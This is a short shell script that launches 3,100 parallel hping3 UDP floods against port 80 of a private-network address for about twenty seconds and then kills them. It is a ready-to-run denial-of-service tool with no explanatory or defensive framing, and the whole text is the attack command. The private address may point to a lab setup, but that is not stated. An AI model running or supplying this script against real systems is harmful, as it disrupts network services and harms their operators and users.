 
for i in {1..3100}; do
  hping3 --udp -p 80 --flood --faster 192.168.0.106 &
done
 
sleep 10
 
sleep 10
 
killall hping3
